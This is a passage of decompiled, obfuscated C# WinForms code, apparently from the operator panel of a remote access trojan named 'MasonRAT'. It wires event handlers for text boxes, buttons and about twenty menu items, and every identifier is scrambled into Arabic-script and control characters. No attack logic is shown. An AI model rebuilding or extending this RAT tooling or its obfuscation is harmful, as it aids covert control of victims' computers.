  internal virtual Guna2TextBox \u2694️MasonRAT\u270Cط\u060Aٽــمڕـڙــ\u060Dٽـط\u0609ــۜ\u060D { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2TextBox \u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B
  {
    get => this.\u2694️MasonRAT\u270Cڛ\u060Aژٻ\u060D\u0609اـٺـڛبڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0020ڞڙۙۏٻـټـ\u0608ٺــٻژ̍\u060B\u0020\u0609);
      Guna2TextBox masonRatڛژٻاـٺـڛبڙ1 = this.\u2694️MasonRAT\u270Cڛ\u060Aژٻ\u060D\u0609اـٺـڛبڙ;
      if (masonRatڛژٻاـٺـڛبڙ1 != null)
        masonRatڛژٻاـٺـڛبڙ1.TextChanged -= eventHandler;
      this.\u2694️MasonRAT\u270Cڛ\u060Aژٻ\u060D\u0609اـٺـڛبڙ = value;
      Guna2TextBox masonRatڛژٻاـٺـڛبڙ2 = this.\u2694️MasonRAT\u270Cڛ\u060Aژٻ\u060D\u0609اـٺـڛبڙ;
      if (masonRatڛژٻاـٺـڛبڙ2 == null)
        return;
      masonRatڛژٻاـٺـڛبڙ2.TextChanged += eventHandler;
    }
  }

  [field: AccessedThroughProperty("TextBox3")]
  internal virtual Guna2TextBox \u2694️MasonRAT\u270C̍ﯧـڙ\u0609ڕڙ\u060Dـ\u060Dـ\u060Cــﯧ\u060B\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("GroupBox1")]
  internal virtual GroupBox \u2694️MasonRAT\u270Cـ\u060Cــ\u060Bۛـۭــۙـ\u060Cـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2GradientButton \u2694️MasonRAT\u270Cمۙڙڙۙـﻻٸ\u060Eڅ\u060D
  {
    get => this.\u2694️MasonRAT\u270Cۙ\u060Dٺئټ\u060Fــ\u060Dۛـ\u060Aمڇ\u060Dﻋٸ\u0608\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0020ـ\u060A\u0020̍ڕۚڅـةبٺڅڇئڙـٺ\u0609ـ);
      Guna2GradientButton masonRatۙٺئټــۛـمڇﻋٸ1 = this.\u2694️MasonRAT\u270Cۙ\u060Dٺئټ\u060Fــ\u060Dۛـ\u060Aمڇ\u060Dﻋٸ\u0608\u0608;
      if (masonRatۙٺئټــۛـمڇﻋٸ1 != null)
        masonRatۙٺئټــۛـمڇﻋٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۙ\u060Dٺئټ\u060Fــ\u060Dۛـ\u060Aمڇ\u060Dﻋٸ\u0608\u0608 = value;
      Guna2GradientButton masonRatۙٺئټــۛـمڇﻋٸ2 = this.\u2694️MasonRAT\u270Cۙ\u060Dٺئټ\u060Fــ\u060Dۛـ\u060Aمڇ\u060Dﻋٸ\u0608\u0608;
      if (masonRatۙٺئټــۛـمڇﻋٸ2 == null)
        return;
      masonRatۙٺئټــۛـمڇﻋٸ2.Click += eventHandler;
    }
  }

  internal virtual Guna2ContextMenuStrip \u2694️MasonRAT\u270Cڙ\u060E\u060Cد\u060Aـ\u060Cم\u060E\u060Bٽﮪ
  {
    get => this.\u2694️MasonRAT\u270Cئ\u0608\u0608̍ىــڜ\u060Dڼڟڅۭ\u060A\u060Aــ\u0609\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      CancelEventHandler cancelEventHandler = new CancelEventHandler(this.\u2694️MasonRAT\u270Cـﯧټ\u060E\u060D\u060A\u0020ـڙٻ);
      Guna2ContextMenuStrip masonRatئ̍ىــڜڼڟڅۭــ1 = this.\u2694️MasonRAT\u270Cئ\u0608\u0608̍ىــڜ\u060Dڼڟڅۭ\u060A\u060Aــ\u0609\u060D;
      if (masonRatئ̍ىــڜڼڟڅۭــ1 != null)
        masonRatئ̍ىــڜڼڟڅۭــ1.Opening -= cancelEventHandler;
      this.\u2694️MasonRAT\u270Cئ\u0608\u0608̍ىــڜ\u060Dڼڟڅۭ\u060A\u060Aــ\u0609\u060D = value;
      Guna2ContextMenuStrip masonRatئ̍ىــڜڼڟڅۭــ2 = this.\u2694️MasonRAT\u270Cئ\u0608\u0608̍ىــڜ\u060Dڼڟڅۭ\u060A\u060Aــ\u0609\u060D;
      if (masonRatئ̍ىــڜڼڟڅۭــ2 == null)
        return;
      masonRatئ̍ىــڜڼڟڅۭــ2.Opening += cancelEventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڝــڼڕــ\u060Aـ\u060B
  {
    get => this.\u2694️MasonRAT\u270Cــ\u060Fﻋּ\u060C\u060Fدىـ\u060Aٸڝ\u060Dٸ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۚټ\u060Dـــﯧــگڕ\u060A\u060Fڜـ\u060A\u060B);
      ToolStripMenuItem masonRatــﻋּدىـٸڝٸ1 = this.\u2694️MasonRAT\u270Cــ\u060Fﻋּ\u060C\u060Fدىـ\u060Aٸڝ\u060Dٸ;
      if (masonRatــﻋּدىـٸڝٸ1 != null)
        masonRatــﻋּدىـٸڝٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــ\u060Fﻋּ\u060C\u060Fدىـ\u060Aٸڝ\u060Dٸ = value;
      ToolStripMenuItem masonRatــﻋּدىـٸڝٸ2 = this.\u2694️MasonRAT\u270Cــ\u060Fﻋּ\u060C\u060Fدىـ\u060Aٸڝ\u060Dٸ;
      if (masonRatــﻋּدىـٸڝٸ2 == null)
        return;
      masonRatــﻋּدىـٸڝٸ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Bﻋ\u060C̍ٸئ\u060A\u060Dـڕدڛـڼ\u0608ب
  {
    get => this.\u2694️MasonRAT\u270Cــ\u060Aڙڛڞ\u060Bﻻ\u0608\u060Aــٻٺٺ\u060Aـڅ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ۡﮪ̍ـٻٸ\u060Fڼؤٺ);
      ToolStripMenuItem ratــڙڛڞﻻــٻٺٺـڅ1 = this.\u2694️MasonRAT\u270Cــ\u060Aڙڛڞ\u060Bﻻ\u0608\u060Aــٻٺٺ\u060Aـڅ;
      if (ratــڙڛڞﻻــٻٺٺـڅ1 != null)
        ratــڙڛڞﻻــٻٺٺـڅ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــ\u060Aڙڛڞ\u060Bﻻ\u0608\u060Aــٻٺٺ\u060Aـڅ = value;
      ToolStripMenuItem ratــڙڛڞﻻــٻٺٺـڅ2 = this.\u2694️MasonRAT\u270Cــ\u060Aڙڛڞ\u060Bﻻ\u0608\u060Aــٻٺٺ\u060Aـڅ;
      if (ratــڙڛڞﻻــٻٺٺـڅ2 == null)
        return;
      ratــڙڛڞﻻــٻٺٺـڅ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem5")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Eــڟڙـ\u060Aۜــ\u0608ـٸٸ\u060Aٸـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙ\u060D\u0608ۛــ\u0608ڜۭـ̍\u060F\u0608ٽۭٽــ\u060Dـ
  {
    get => this.\u2694️MasonRAT\u270Cــ\u0609\u060F\u0608ڙ\u060Aٽڜ̍ﻼڦـٻּټ\u060Aـ\u060D\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڙ\u0609ٸڙ\u060Aـ\u0609ڙـ\u0609ـﻋْ);
      ToolStripMenuItem ratــڙٽڜ̍ﻼڦـٻּټـ1 = this.\u2694️MasonRAT\u270Cــ\u0609\u060F\u0608ڙ\u060Aٽڜ̍ﻼڦـٻּټ\u060Aـ\u060D\u060A;
      if (ratــڙٽڜ̍ﻼڦـٻּټـ1 != null)
        ratــڙٽڜ̍ﻼڦـٻּټـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــ\u0609\u060F\u0608ڙ\u060Aٽڜ̍ﻼڦـٻּټ\u060Aـ\u060D\u060A = value;
      ToolStripMenuItem ratــڙٽڜ̍ﻼڦـٻּټـ2 = this.\u2694️MasonRAT\u270Cــ\u0609\u060F\u0608ڙ\u060Aٽڜ̍ﻼڦـٻּټ\u060Aـ\u060D\u060A;
      if (ratــڙٽڜ̍ﻼڦـٻּټـ2 == null)
        return;
      ratــڙٽڜ̍ﻼڦـٻּټـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0609ژ\u060Fٸـټـڠد\u060D
  {
    get => this.\u2694️MasonRAT\u270Cاـم\u060Aـٽْۙ\u0609بڙ\u060Dڇـﻋ\u060A\u060Fۭـ\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۧـ̍ــ\u060Aڙ\u0609ـۜــ);
      ToolStripMenuItem ratاـمـٽْۙبڙڇـﻋۭـ1 = this.\u2694️MasonRAT\u270Cاـم\u060Aـٽْۙ\u0609بڙ\u060Dڇـﻋ\u060A\u060Fۭـ\u0608;
      if (ratاـمـٽْۙبڙڇـﻋۭـ1 != null)
        ratاـمـٽْۙبڙڇـﻋۭـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cاـم\u060Aـٽْۙ\u0609بڙ\u060Dڇـﻋ\u060A\u060Fۭـ\u0608 = value;
      ToolStripMenuItem ratاـمـٽْۙبڙڇـﻋۭـ2 = this.\u2694️MasonRAT\u270Cاـم\u060Aـٽْۙ\u0609بڙ\u060Dڇـﻋ\u060A\u060Fۭـ\u0608;
      if (ratاـمـٽْۙبڙڇـﻋۭـ2 == null)
        return;
      ratاـمـٽْۙبڙڇـﻋۭـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٻط\u0609بــٺ\u0608ــۛـ
  {
    get => this.\u2694️MasonRAT\u270Cـــۚ\u060F\u0609ڙـد\u0608ٸڅڙء\u060Aڦ\u060Cﻻة;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cــ\u0609ـۏڦـ\u060Dـ\u060D\u0608\u060Aڜ);
      ToolStripMenuItem ratـــۚڙـدٸڅڙءڦﻻة1 = this.\u2694️MasonRAT\u270Cـــۚ\u060F\u0609ڙـد\u0608ٸڅڙء\u060Aڦ\u060Cﻻة;
      if (ratـــۚڙـدٸڅڙءڦﻻة1 != null)
        ratـــۚڙـدٸڅڙءڦﻻة1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـــۚ\u060F\u0609ڙـد\u0608ٸڅڙء\u060Aڦ\u060Cﻻة = value;
      ToolStripMenuItem ratـــۚڙـدٸڅڙءڦﻻة2 = this.\u2694️MasonRAT\u270Cـــۚ\u060F\u0609ڙـد\u0608ٸڅڙء\u060Aڦ\u060Cﻻة;
      if (ratـــۚڙـدٸڅڙءڦﻻة2 == null)
        return;
      ratـــۚڙـدٸڅڙءڦﻻة2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـٸحټ\u0608ڼٻڙژ\u0608ڙـ\u0609\u060C\u060Dـڠ
  {
    get => this.\u2694️MasonRAT\u270Cم\u060A\u0608ـڙ\u060Bـۡٺاــ\u060Dڙـٺٽ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۜڇىئۙ\u060D\u0609ڞ\u060Bۏۧ);
      ToolStripMenuItem ratمـڙـۡٺاــڙـٺٽ1 = this.\u2694️MasonRAT\u270Cم\u060A\u0608ـڙ\u060Bـۡٺاــ\u060Dڙـٺٽ;
      if (ratمـڙـۡٺاــڙـٺٽ1 != null)
        ratمـڙـۡٺاــڙـٺٽ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cم\u060A\u0608ـڙ\u060Bـۡٺاــ\u060Dڙـٺٽ = value;
      ToolStripMenuItem ratمـڙـۡٺاــڙـٺٽ2 = this.\u2694️MasonRAT\u270Cم\u060A\u0608ـڙ\u060Bـۡٺاــ\u060Dڙـٺٽ;
      if (ratمـڙـۡٺاــڙـٺٽ2 == null)
        return;
      ratمـڙـۡٺاــڙـٺٽ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Eــۏڇـ\u0608ـ\u060D\u060E\u060A
  {
    get => this.\u2694️MasonRAT\u270Cڙــ\u0609\u0020ڛٸ̍ـ\u0608ـئ\u060Dاـــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۧﻋ\u060A\u060Dۛــڞ؁ـ\u060F\u0609ـ̍̍);
      ToolStripMenuItem ratڙــڛٸ̍ــئاـــ1 = this.\u2694️MasonRAT\u270Cڙــ\u0609\u0020ڛٸ̍ـ\u0608ـئ\u060Dاـــ;
      if (ratڙــڛٸ̍ــئاـــ1 != null)
        ratڙــڛٸ̍ــئاـــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙــ\u0609\u0020ڛٸ̍ـ\u0608ـئ\u060Dاـــ = value;
      ToolStripMenuItem ratڙــڛٸ̍ــئاـــ2 = this.\u2694️MasonRAT\u270Cڙــ\u0609\u0020ڛٸ̍ـ\u0608ـئ\u060Dاـــ;
      if (ratڙــڛٸ̍ــئاـــ2 == null)
        return;
      ratڙــڛٸ̍ــئاـــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڇ\u0609څﻋـ\u060C\u0608\u0609ـ\u060C
  {
    get => this.\u2694️MasonRAT\u270Cڇٺڣ\u060Aۚـــ\u060Aۧۧټ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـڙڟ؁\u0608ټــڙ\u060Bــ\u060Dٺ);
      ToolStripMenuItem masonRatڇٺڣۚـــۧۧټ1 = this.\u2694️MasonRAT\u270Cڇٺڣ\u060Aۚـــ\u060Aۧۧټ;
      if (masonRatڇٺڣۚـــۧۧټ1 != null)
        masonRatڇٺڣۚـــۧۧټ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڇٺڣ\u060Aۚـــ\u060Aۧۧټ = value;
      ToolStripMenuItem masonRatڇٺڣۚـــۧۧټ2 = this.\u2694️MasonRAT\u270Cڇٺڣ\u060Aۚـــ\u060Aۧۧټ;
      if (masonRatڇٺڣۚـــۧۧټ2 == null)
        return;
      masonRatڇٺڣۚـــۧۧټ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــۙﻻ\u060Aﻻـ\u060Aڼٻحطڟڙ
  {
    get => this.\u2694️MasonRAT\u270C\u060F\u060F\u0609ۏڣ\u0609ـۡـۧـــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0609\u060E\u0609ـ\u060Cٺۙ\u060Eـﻋـ\u060Bڝب);
      ToolStripMenuItem masonRatۏڣـۡـۧـــ1 = this.\u2694️MasonRAT\u270C\u060F\u060F\u0609ۏڣ\u0609ـۡـۧـــ;
      if (masonRatۏڣـۡـۧـــ1 != null)
        masonRatۏڣـۡـۧـــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060F\u060F\u0609ۏڣ\u0609ـۡـۧـــ = value;
      ToolStripMenuItem masonRatۏڣـۡـۧـــ2 = this.\u2694️MasonRAT\u270C\u060F\u060F\u0609ۏڣ\u0609ـۡـۧـــ;
      if (masonRatۏڣـۡـۧـــ2 == null)
        return;
      masonRatۏڣـۡـۧـــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــاـٽةـءـٺ\u0608ـڦټڅد
  {
    get => this.\u2694️MasonRAT\u270C\u060Fـ\u0608؁باڙـــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ̍دټٺـــ̍ـــ\u0608);
      ToolStripMenuItem masonRatـ؁باڙـــ1 = this.\u2694️MasonRAT\u270C\u060Fـ\u0608؁باڙـــ;
      if (masonRatـ؁باڙـــ1 != null)
        masonRatـ؁باڙـــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Fـ\u0608؁باڙـــ = value;
      ToolStripMenuItem masonRatـ؁باڙـــ2 = this.\u2694️MasonRAT\u270C\u060Fـ\u0608؁باڙـــ;
      if (masonRatـ؁باڙـــ2 == null)
        return;
      masonRatـ؁باڙـــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060D\u060A\u060D\u060Dـﯧ\u0609ٸا\u060Aـﻻ\u060Dـء\u060F\u060B
  {
    get => this.\u2694️MasonRAT\u270C\u060Cؤۨڙـ\u060Aڞــــ\u0608\u0608ـ\u060Aٺﻻ\u0020ـ\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609\u0608ــ\u0609ـ\u060Bּۙـ\u0608ـ);
      ToolStripMenuItem ratؤۨڙـڞـــــٺﻻـ1 = this.\u2694️MasonRAT\u270C\u060Cؤۨڙـ\u060Aڞــــ\u0608\u0608ـ\u060Aٺﻻ\u0020ـ\u0608;
      if (ratؤۨڙـڞـــــٺﻻـ1 != null)
        ratؤۨڙـڞـــــٺﻻـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Cؤۨڙـ\u060Aڞــــ\u0608\u0608ـ\u060Aٺﻻ\u0020ـ\u0608 = value;
      ToolStripMenuItem ratؤۨڙـڞـــــٺﻻـ2 = this.\u2694️MasonRAT\u270C\u060Cؤۨڙـ\u060Aڞــــ\u0608\u0608ـ\u060Aٺﻻ\u0020ـ\u0608;
      if (ratؤۨڙـڞـــــٺﻻـ2 == null)
        return;
      ratؤۨڙـڞـــــٺﻻـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u0609\u0608ۙءـۙ\u060A\u060C\u060A\u0609\u060A\u060D
  {
    get => this.\u2694️MasonRAT\u270C\u0608ۧڣ\u060C\u0608ٻ\u0609\u0608\u0609ـۙحּـڙۙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڙــــ\u060Dءּۡۛ\u060Eﻼٽـ\u060Aـ);
      ToolStripMenuItem masonRatۧڣٻـۙحּـڙۙ1 = this.\u2694️MasonRAT\u270C\u0608ۧڣ\u060C\u0608ٻ\u0609\u0608\u0609ـۙحּـڙۙ;
      if (masonRatۧڣٻـۙحּـڙۙ1 != null)
        masonRatۧڣٻـۙحּـڙۙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608ۧڣ\u060C\u0608ٻ\u0609\u0608\u0609ـۙحּـڙۙ = value;
      ToolStripMenuItem masonRatۧڣٻـۙحּـڙۙ2 = this.\u2694️MasonRAT\u270C\u0608ۧڣ\u060C\u0608ٻ\u0609\u0608\u0609ـۙحּـڙۙ;
      if (masonRatۧڣٻـۙحּـڙۙ2 == null)
        return;
      masonRatۧڣٻـۙحּـڙۙ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڟــٺـ\u060D\u060A\u0020ۡـ
  {
    get => this.\u2694️MasonRAT\u270Cڠـ\u0608ؤـ̍ــ\u0609ـﻋ\u060Bٽ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0609ڕ؁ئڝ؁\u060Aـٺــ\u0609\u060Eۭ̍ۏْ\u0608);
      ToolStripMenuItem masonRatڠـؤـ̍ـــﻋٽ1 = this.\u2694️MasonRAT\u270Cڠـ\u0608ؤـ̍ــ\u0609ـﻋ\u060Bٽ;
      if (masonRatڠـؤـ̍ـــﻋٽ1 != null)
        masonRatڠـؤـ̍ـــﻋٽ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڠـ\u0608ؤـ̍ــ\u0609ـﻋ\u060Bٽ = value;
      ToolStripMenuItem masonRatڠـؤـ̍ـــﻋٽ2 = this.\u2694️MasonRAT\u270Cڠـ\u0608ؤـ̍ــ\u0609ـﻋ\u060Bٽ;
      if (masonRatڠـؤـ̍ـــﻋٽ2 == null)
        return;
      masonRatڠـؤـ̍ـــﻋٽ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608\u060Dـــــ̍\u060Dــڕـةﮪــ\u0608
  {
    get => this.\u2694️MasonRAT\u270Cڙــٺـ\u060A\u060E\u060Aـڝۧۙـ\u060C\u060D\u060Dټ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ڙڙـۚ\u060Dـڜ\u060Aﻻڝبـ);
      ToolStripMenuItem masonRatڙــٺــڝۧۙـټ1 = this.\u2694️MasonRAT\u270Cڙــٺـ\u060A\u060E\u060Aـڝۧۙـ\u060C\u060D\u060Dټ;
      if (masonRatڙــٺــڝۧۙـټ1 != null)
        masonRatڙــٺــڝۧۙـټ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙــٺـ\u060A\u060E\u060Aـڝۧۙـ\u060C\u060D\u060Dټ = value;
      ToolStripMenuItem masonRatڙــٺــڝۧۙـټ2 = this.\u2694️MasonRAT\u270Cڙــٺـ\u060A\u060E\u060Aـڝۧۙـ\u060C\u060D\u060Dټ;
      if (masonRatڙــٺــڝۧۙـټ2 == null)
        return;
      masonRatڙــٺــڝۧۙـټ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cئءـ\u0608ڞ\u0608ڙـْـﻼڝـ\u060A\u060Cـ\u060Fﻋ
  {
    get => this.\u2694️MasonRAT\u270C\u0608ْح\u0608\u060Bۙﮪۙ̍گ\u060Aــ\u060Fٺ\u060Dژﯧـﻼ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Eۡگــــۚڙــڙددڙ\u0609ـ\u060D\u060E\u060B);
      ToolStripMenuItem ratْحۙﮪۙ̍گــٺژﯧـﻼ1 = this.\u2694️MasonRAT\u270C\u0608ْح\u0608\u060Bۙﮪۙ̍گ\u060Aــ\u060Fٺ\u060Dژﯧـﻼ;
      if (ratْحۙﮪۙ̍گــٺژﯧـﻼ1 != null)
        ratْحۙﮪۙ̍گــٺژﯧـﻼ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608ْح\u0608\u060Bۙﮪۙ̍گ\u060Aــ\u060Fٺ\u060Dژﯧـﻼ = value;
      ToolStripMenuItem ratْحۙﮪۙ̍گــٺژﯧـﻼ2 = this.\u2694️MasonRAT\u270C\u0608ْح\u0608\u060Bۙﮪۙ̍گ\u060Aــ\u060Fٺ\u060Dژﯧـﻼ;
      if (ratْحۙﮪۙ̍گــٺژﯧـﻼ2 == null)
        return;
      ratْحۙﮪۙ̍گــٺژﯧـﻼ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem22")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـژڟۧـﻋ\u060C̍\u0608\u0608\u060Eــ̨ـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Bؤﻻڙ\u060D\u060D\u0609\u060C\u060Aـ\u060B\u0609گڼٽۡۛ\u060Eـ
  {
    get => this.\u2694️MasonRAT\u270Cۛدــﻋ\u060A\u0609ﻻﻋﻻٻ\u060Aة;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڠ\u060Bــــﻋۛۧ̍ٺ\u060D\u060F);
      ToolStripMenuItem masonRatۛدــﻋﻻﻋﻻٻة1 = this.\u2694️MasonRAT\u270Cۛدــﻋ\u060A\u0609ﻻﻋﻻٻ\u060Aة;
      if (masonRatۛدــﻋﻻﻋﻻٻة1 != null)
        masonRatۛدــﻋﻻﻋﻻٻة1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۛدــﻋ\u060A\u0609ﻻﻋﻻٻ\u060Aة = value;
      ToolStripMenuItem masonRatۛدــﻋﻻﻋﻻٻة2 = this.\u2694️MasonRAT\u270Cۛدــﻋ\u060A\u0609ﻻﻋﻻٻ\u060Aة;
      if (masonRatۛدــﻋﻻﻋﻻٻة2 == null)
        return;
      masonRatۛدــﻋﻻﻋﻻٻة2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060B\u060F\u060Eـ\u060Fۚ\u060B\u060Dﯧح
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060Dـٻٺ\u060Dٽ\u060Eـټ\u0608ـڛـٸ\u0609\u0608گּ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ۡـڙ\u0609ــڙ\u060Eـڙؤۜـ\u060Aڙ);
      ToolStripMenuItem ratــٻٺٽـټـڛـٸگּ1 = this.\u2694️MasonRAT\u270Cـ\u060Dـٻٺ\u060Dٽ\u060Eـټ\u0608ـڛـٸ\u0609\u0608گּ;
      if (ratــٻٺٽـټـڛـٸگּ1 != null)
        ratــٻٺٽـټـڛـٸگּ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060Dـٻٺ\u060Dٽ\u060Eـټ\u0608ـڛـٸ\u0609\u0608گּ = value;
      ToolStripMenuItem ratــٻٺٽـټـڛـٸگּ2 = this.\u2694️MasonRAT\u270Cـ\u060Dـٻٺ\u060Dٽ\u060Eـټ\u0608ـڛـٸ\u0609\u0608گּ;
      if (ratــٻٺٽـټـڛـٸگּ2 == null)
        return;
      ratــٻٺٽـټـڛـٸگּ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cﻼ\u0608ٺۡة\u060Eۙ\u060Dــ؁د
  {
    get => this.\u2694️MasonRAT\u270Cـ\u0609\u0608\u060Bٸ\u0609\u060B\u060D\u0609ـڙڼ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٺڠۙۨ\u0608ــ\u0609ﯧٺڙۙــ\u060Fـ̍ڦڙ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cـ\u0609\u0608\u060Bٸ\u0609\u060B\u060D\u0609ـڙڼ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u0609\u0608\u060Bٸ\u0609\u060B\u060D\u0609ـڙڼ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cـ\u0609\u0608\u060Bٸ\u0609\u060B\u060D\u0609ـڙڼ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem29")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڝ\u0608\u0608ۚـٺ̍\u060A\u060Dـټ\u060Cب\u060F\u0608د\u0609بـڅ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cْڙــۨـ\u060D\u060D\u060Aڦ\u0608
  {
    get => this.\u2694️MasonRAT\u270C\u060Cـ\u060Dڠڜڙ\u060Dٺحڦ\u0608\u060Dـ\u0609\u060C;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Fـءۭ\u060F\u060Dڅٸڙـ);
      ToolStripMenuItem masonRatـڠڜڙٺحڦـ1 = this.\u2694️MasonRAT\u270C\u060Cـ\u060Dڠڜڙ\u060Dٺحڦ\u0608\u060Dـ\u0609\u060C;
      if (masonRatـڠڜڙٺحڦـ1 != null)
        masonRatـڠڜڙٺحڦـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Cـ\u060Dڠڜڙ\u060Dٺحڦ\u0608\u060Dـ\u0609\u060C = value;
      ToolStripMenuItem masonRatـڠڜڙٺحڦـ2 = this.\u2694️MasonRAT\u270C\u060Cـ\u060Dڠڜڙ\u060Dٺحڦ\u0608\u060Dـ\u0609\u060C;
      if (masonRatـڠڜڙٺحڦـ2 == null)
        return;
      masonRatـڠڜڙٺحڦـ2.Click += eventHandler;
    }
  }

